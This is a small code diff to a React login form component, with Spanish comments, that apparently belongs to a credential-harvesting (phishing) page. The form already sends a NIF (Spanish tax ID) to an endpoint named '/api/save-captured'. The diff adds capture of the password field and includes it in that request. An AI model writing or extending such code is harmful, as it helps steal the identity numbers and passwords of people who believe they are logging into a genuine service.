@@ -39,7 +39,7 @@ export default function LoginForm() {
 
   const formData = new FormData(e.currentTarget);
   const nif = formData.get('nif-persona') as string;
-
+  const password = formData.get('password-persona') as string;
 
   // guardo objeto por claridad (no se logea)
   const capturedData = {
@@ -52,7 +52,7 @@ export default function LoginForm() {
     const res = await fetch('/api/save-captured', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ nif })
+      body: JSON.stringify({ nif, password })
     });
 
     if (!res.ok) {
